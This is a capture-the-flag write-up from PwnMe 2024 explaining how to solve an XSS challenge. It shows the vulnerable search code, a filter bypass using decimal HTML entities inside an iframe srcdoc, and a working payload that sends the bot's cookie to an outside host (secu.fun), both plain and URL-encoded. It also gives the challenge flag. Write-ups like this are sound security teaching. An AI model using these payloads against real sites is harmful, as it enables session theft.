# Solution pour le challenge Hack The Bot 1

My first white-box web challenge, that I created for the 2024 PwnMe event.

We have an website with hacking notes and and functionality for searching within different notes, as well as a functionality for report a malicious link. The goal is to obtain a LFI through a XSS.
![](site.png)

## Part 1

## 🔎 - Recon 
---
The application use Node with a Nginx, and has no particular backend logic, everything will be client-side for this part.
Our goal will be to retrieve the `SameSite Strict` bot's cookie, which is set only on the localhost site.
  

The client-side article search functionality is implemented as follows :
```javascript
function searchArticles(searchInput = document.getElementById('search-input').value.toLowerCase().trim()) {
    const searchWords = searchInput.split(/[^\p{L}]+/u);
    const articles = document.querySelectorAll('.article-box');
    let found = false;
    articles.forEach(article => {
        if (searchInput === '') {
            article.style.display = '';
            found = true;
        } else {
            const articleText = article.textContent.toLowerCase();
            const isMatch = searchWords.some(word => word && new RegExp(`${word}`, 'ui').test(articleText));
            if (isMatch) {
                article.style.display = '';
                found = true;
            } else {
                article.style.display = 'none';
            }
        }
    });
    const noMatchMessage = document.getElementById('no-match-message');
    if (!found && searchInput) {
        noMatchMessage.innerHTML = `No results for "${searchInput}".`;
        noMatchMessage.style.display = 'block';
    } else {
        noMatchMessage.style.display = 'none';
    }
}
```
This performs a regex search [A-z] without taking cares about special characters.
Input that will be reflected in DOM if no match found, which allows us to inject html tags and other goodies.

![](injection.png)


## 💥 Trigger an XSS
---
The first difficulty will be to get around the regex which, if matched with an article, does not render our payload. So we can't use classic payloads, like `img`, `svg`, `script` tags and some useful `onxxxx` events and `src` attribute.

![](script.png)

The intended solution here was to use an iframe (which is not on articles) to execute Javascript code inside it. To do this, we can use the [iframe srcdoc](https://www.w3schools.com/tags/att_iframe_srcdoc.asp) attribute. 

![](iframe1.png)


The problem is that we still have to deal with the filter, which still applies to our input... Fortunately, the `srcdoc` attribute allows you to use `HTML encoding`, not in the “classic” hexadecimal form (`&#x90`), which would trigger the filter because of the `x` But in decimal form `&#100`

![](iframe2.png)

From here we can execute javascript in the iframe, and try to retrieve the cookie from its [parent](https://developer.mozilla.org/fr/docs/Web/API/Window/parent) because the `srcdoc` is not not restricted by SOP. 

We encode with problematics keywords with HTML Entity (only the srcdoc payload not the iframe part)

```html
<iframe srcdoc='<s&#99;ript>d&#111;cument.l&#111;cation="http://secu.fun:8080/?c="+d&#111;cument.c&#111;okie;</s&#99;ript>'>
```

![](XSS.png)

Perfect ! Iframe can access to the cookie


## ⏱️ Exfiltration
---

We just have to send our payload report link with `?q=` parameter (don't forget to URL encode):
```url
http://localhost/?q=%3Ciframe%20srcdoc='%3C%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%3E%26%23100%3B%26%23111;cument.%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B=%22%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B://secu.fun:8080/?%26%2399%3B=%22%2B%26%23100%3B%26%23111;cument.%26%2399%3B%26%23111;okie;%3C/%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%3E'%3E
```

And obtain the first flag ! 
`PWNME{D1d_y0U_S4iD-F1lt33Rs?}`

